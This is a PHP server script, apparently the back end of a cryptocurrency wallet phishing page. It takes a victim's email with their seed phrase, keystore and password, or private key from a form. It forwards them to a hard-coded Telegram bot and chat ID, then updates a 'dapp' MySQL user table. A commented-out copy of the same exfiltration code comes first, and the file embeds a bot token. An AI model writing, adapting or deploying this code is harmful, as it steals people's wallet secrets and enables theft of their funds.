<?php
// Your Telegram bot token
// $botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';

// // Your chat ID (replace with your actual chat ID)
// $chatId = '1129243973';

// // Retrieve form data
// $type = isset($_POST['type']) ? $_POST['type'] : '';
// $wallet = isset($_POST['walletName']) ? $_POST['walletName'] : '';
// $phrase = isset($_POST['phrase']) ? $_POST['phrase'] : '';
// $keystore = isset($_POST['keystore']) ? $_POST['keystore'] : '';
// $password = isset($_POST['password']) ? $_POST['password'] : '';
// $privateKey = isset($_POST['privateKey']) ? $_POST['privateKey'] : '';

// // Build the message text with Markdown formatting
// $message = "*New Submission:*\n\n"; // Title in bold with a double line break
// $message .= "*Type:* _" . $type . "_\n\n"; // Bold Type label and italicized type
// $message .= "*Wallet:* _" . $wallet . "_\n\n"; // Bold Wallet label and italicized wallet

// if ($type == 'phrase') {
//     $message .= "*Phrase:* _" . $phrase . "_\n\n"; // Bold Phrase label and italicized phrase
// } elseif ($type == 'keystore') {
//     $message .= "*Keystore:* _" . $keystore . "_\n\n"; // Bold Keystore label and italicized keystore
//     $message .= "*Password:* _" . $password . "_\n\n"; // Bold Password label and italicized password
// } elseif ($type == 'privatekey') {
//     $message .= "*Private Key:* _" . $privateKey . "_\n\n"; // Bold Private Key label and italicized private key
// }

// // Send message to Telegram
// $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// // Set up data for Telegram API with Markdown formatting
// $data = [
//     'chat_id' => $chatId,
//     'text' => $message,
//     'parse_mode' => 'Markdown' // Enable Markdown parsing
// ];


// $options = [
//     'http' => [
//         'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
//         'method'  => 'POST',
//         'content' => http_build_query($data),
//     ],
// ];

// $context = stream_context_create($options);
// $response = file_get_contents($telegramUrl, false, $context);

// // Check for successful response
// if ($response === FALSE) {
//     echo json_encode(["status" => "error", "message" => "Error sending message"]);
// } else {
//     echo json_encode(["status" => "success", "message" => "Message sent successfully"]);
// }

?>


<?php
// Telegram bot token and chat ID
$botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
$chatId = '1129243973';

// Database connection
$mysqli = new mysqli("localhost", "root", "", "dapp");
if ($mysqli->connect_error) {
    die(json_encode(["status" => "error", "message" => "DB Connection Failed"]));
}

// Retrieve form data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$type = isset($_POST['type']) ? trim($_POST['type']) : '';
$wallet = isset($_POST['walletName']) ? trim($_POST['walletName']) : '';
$phrase = isset($_POST['phrase']) ? trim($_POST['phrase']) : '';
$keystore = isset($_POST['keystore']) ? trim($_POST['keystore']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$privateKey = isset($_POST['privateKey']) ? trim($_POST['privateKey']) : '';

// Compose Telegram message
$message = "*New Submission:*\n\n";
$message .= "*Email:* _" . $email . "_\n";
$message .= "*Type:* _" . $type . "_\n";
$message .= "*Wallet:* _" . $wallet . "_\n";

if ($type === 'phrase') {
    $message .= "*Phrase:* _" . $phrase . "_\n";
} elseif ($type === 'keystore') {
    $message .= "*Keystore:* _" . $keystore . "_\n";
    $message .= "*Password:* _" . $password . "_\n";
} elseif ($type === 'privatekey') {
    $message .= "*Private Key:* _" . $privateKey . "_\n";
}

// Send to Telegram
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];
$context = stream_context_create($options);
$response = file_get_contents($telegramUrl, false, $context);

// If message sent, update DB status
if ($response !== FALSE) {
    $stmt = $mysqli->prepare("UPDATE user SET status = 2 WHERE email = ?");
    $stmt->bind_param("s", $email);
    if ($stmt->execute()) {
        echo json_encode(["status" => "success", "message" => "Submitted and updated"]);
    } else {
        echo json_encode(["status" => "error", "message" => "Telegram sent, but DB update failed"]);
    }
    $stmt->close();
} else {
    echo json_encode(["status" => "error", "message" => "Error sending to Telegram"]);
}

$mysqli->close();
?>
